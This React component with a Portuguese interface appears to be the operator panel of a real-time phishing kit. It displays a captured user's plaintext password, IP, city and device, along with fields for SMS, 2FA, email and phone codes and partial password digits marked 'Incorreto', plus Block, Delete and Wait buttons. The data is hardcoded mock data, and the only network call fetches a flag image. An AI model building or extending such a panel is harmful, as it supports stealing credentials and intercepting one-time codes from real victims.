
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Shield, Trash2, Clock, Monitor, Globe, User, Lock, MapPin } from "lucide-react";
import { useState, useEffect } from "react";

interface CountryData {
  name: { common: string };
  flags: { svg: string };
}

export const UserDetails = () => {
  const [countryData, setCountryData] = useState<CountryData | null>(null);

  useEffect(() => {
    // Fetch Brazil flag data
    fetch('https://restcountries.com/v3.1/alpha/BR')
      .then(response => response.json())
      .then(data => setCountryData(data[0]))
      .catch(error => console.error('Error fetching country data:', error));
  }, []);

  return (
    <Card className="bg-gray-800 border-gray-700 w-full max-w-md">
      <CardContent className="p-3">
        {/* Header - Username e Status */}
        <div className="flex items-center justify-between mb-3">
          <h3 className="text-white font-bold text-sm">carlos74</h3>
          <div className="flex items-center space-x-1">
            <div className="w-2 h-2 bg-green-500 rounded-full"></div>
            <span className="text-green-400 text-xs">Online</span>
          </div>
        </div>

        {/* Grid Principal - Informações */}
        <div className="grid grid-cols-2 gap-2 mb-3">
          <div className="bg-gray-700 rounded p-2">
            <div className="flex items-center space-x-1 mb-1">
              <User className="h-2 w-2 text-gray-400" />
              <span className="text-gray-300 text-xs">Usuário</span>
            </div>
            <span className="text-white text-xs">carlos74</span>
          </div>

          <div className="bg-gray-700 rounded p-2">
            <div className="flex items-center space-x-1 mb-1">
              <Lock className="h-2 w-2 text-gray-400" />
              <span className="text-gray-300 text-xs">Senha</span>
            </div>
            <span className="text-white text-xs">pass123!</span>
          </div>

          <div className="bg-gray-700 rounded p-2">
            <div className="flex items-center space-x-1 mb-1">
              <Globe className="h-2 w-2 text-gray-400" />
              <span className="text-gray-300 text-xs">IP</span>
            </div>
            <span className="text-white text-xs">192.168.1.104</span>
          </div>

          <div className="bg-gray-700 rounded p-2">
            <div className="flex items-center space-x-1 mb-1">
              {countryData && (
                <img 
                  src={countryData.flags.svg} 
                  alt="Brazil flag" 
                  className="h-2 w-3 object-cover rounded-sm"
                />
              )}
              <span className="text-gray-300 text-xs">País</span>
            </div>
            <span className="text-white text-xs">Brasil</span>
          </div>

          <div className="bg-gray-700 rounded p-2">
            <div className="flex items-center space-x-1 mb-1">
              <MapPin className="h-2 w-2 text-gray-400" />
              <span className="text-gray-300 text-xs">Cidade</span>
            </div>
            <span className="text-white text-xs">São Paulo</span>
          </div>

          <div className="bg-gray-700 rounded p-2">
            <div className="flex items-center space-x-1 mb-1">
              <Monitor className="h-2 w-2 text-gray-400" />
              <span className="text-gray-300 text-xs">Dispositivo</span>
            </div>
            <span className="text-white text-xs">iPhone</span>
          </div>
        </div>

        {/* Grid Respostas */}
        <div className="mb-3">
          <h4 className="text-white text-xs font-medium mb-2">Respostas</h4>
          <div className="grid grid-cols-3 gap-1 mb-2">
            {['SMS', 'AUTH', '2FA', 'EMAIL', 'TEL'].map((item, index) => (
              <div key={index} className="bg-gray-600 rounded p-1">
                <div className="text-xs text-gray-300 mb-1">{item}</div>
                <input 
                  type="text" 
                  className="w-full bg-gray-800 text-white text-xs p-1 rounded border-gray-500"
                  placeholder="..."
                />
                <div className="text-xs text-red-400 mt-1">Incorreto</div>
              </div>
            ))}
          </div>
        </div>

        {/* Senhas Adicionais Compactas */}
        <div className="mb-3">
          <h5 className="text-white text-xs font-medium mb-1">Senhas</h5>
          <div className="space-y-1">
            {['4', '6', '8'].map((num, index) => (
              <div key={index} className="flex items-center justify-between bg-gray-600 rounded p-1">
                <span className="text-gray-300 text-xs">SENHA {num}:</span>
                <div className="flex items-center space-x-1">
                  <input 
                    type="text" 
                    className="bg-gray-800 text-white text-xs p-1 rounded border-gray-500 w-12"
                    placeholder="****"
                  />
                  <span className="text-red-400 text-xs">Incorreto</span>
                </div>
              </div>
            ))}
          </div>
        </div>

        {/* Botões de Ação Compactos */}
        <div className="space-y-1">
          <Button className="w-full bg-red-600 hover:bg-red-700 text-white h-6 text-xs" size="sm">
            <Shield className="h-2 w-2 mr-1" />
            Bloquear
          </Button>
          <Button className="w-full bg-red-800 hover:bg-red-900 text-white h-6 text-xs" size="sm">
            <Trash2 className="h-2 w-2 mr-1" />
            Excluir
          </Button>
          <Button className="w-full bg-yellow-600 hover:bg-yellow-700 text-white h-6 text-xs" size="sm">
            <Clock className="h-2 w-2 mr-1" />
            Aguardar
          </Button>
        </div>
      </CardContent>
    </Card>
  );
};
